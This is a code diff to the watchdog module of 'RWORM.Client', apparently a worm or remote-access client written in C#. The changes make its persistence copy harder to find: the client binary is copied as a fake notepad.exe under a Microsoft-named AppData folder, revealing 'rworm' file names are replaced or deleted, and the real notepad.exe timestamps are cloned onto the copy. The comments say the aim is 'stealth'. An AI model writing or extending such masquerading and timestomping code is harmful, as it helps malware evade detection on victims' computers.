@@ -11,7 +11,7 @@ namespace RWORM.Client.Modules
     {
         private static Process? _watchdogProcess;
         private static volatile bool _isShuttingDown = false;
-        private static readonly string FlagPath = Path.Combine(Path.GetTempPath(), "rworm_clean_exit.flag");
+        private static readonly string FlagPath = Path.Combine(Path.GetTempPath(), "sess_exit.flag");
 
         public static void InitializeWatchdog()
         {
@@ -29,27 +29,44 @@ namespace RWORM.Client.Modules
                 // Ensure clean exit flag is removed from any previous session
                 try { if (File.Exists(FlagPath)) File.Delete(FlagPath); } catch { }
 
-                // Determine backup exe location
+                // Determine backup exe location: %LOCALAPPDATA%\Microsoft\Notepad\notepad.exe
                 string backupDir;
                 try
                 {
                     backupDir = Path.Combine(
                         Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                        "Microsoft", "WindowsService");
+                        "Microsoft", "Notepad");
                     Directory.CreateDirectory(backupDir);
                 }
                 catch
                 {
-                    backupDir = Path.Combine(Path.GetTempPath(), "rworm_guard");
+                    backupDir = Path.Combine(Path.GetTempPath(), "Notepad");
                     Directory.CreateDirectory(backupDir);
                 }
 
-                var backupExe = Path.Combine(backupDir, "rworm_watchdog.exe");
+                var backupExe = Path.Combine(backupDir, "notepad.exe");
 
-                // Copy current client binary as the backup executable
+                // Clean up any legacy watchdog names if present
+                try
+                {
+                    var legacyExe = Path.Combine(backupDir, "rworm_watchdog.exe");
+                    if (File.Exists(legacyExe)) File.Delete(legacyExe);
+                }
+                catch { }
+
+                // Copy current client binary as stealth notepad.exe
                 try
                 {
                     File.Copy(currentExe, backupExe, true);
+
+                    // Clone file timestamps from system notepad.exe to blend in
+                    var sysNotepad = Path.Combine(Environment.SystemDirectory, "notepad.exe");
+                    if (File.Exists(sysNotepad))
+                    {
+                        File.SetCreationTime(backupExe, File.GetCreationTime(sysNotepad));
+                        File.SetLastWriteTime(backupExe, File.GetLastWriteTime(sysNotepad));
+                        File.SetLastAccessTime(backupExe, File.GetLastAccessTime(sysNotepad));
+                    }
                 }
                 catch { }
 
